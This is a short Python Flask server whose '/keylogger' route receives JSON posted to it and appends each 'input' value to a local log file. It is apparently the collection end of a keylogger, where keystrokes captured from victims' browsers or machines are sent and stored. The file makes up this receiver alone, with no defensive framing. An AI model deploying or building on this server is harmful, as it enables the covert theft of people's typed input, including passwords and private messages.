from flask import Flask
from flask import request

app = Flask(__name__)
fob=open('log','a')

@app.route('/keylogger', methods=['POST'])
def receive_keys():
    if request.method == "POST":
        if request.is_json:
             data = request.get_json()
             fob.write(data['input'])
             fob.write('\n')
    return "Ok", 200

app.run()
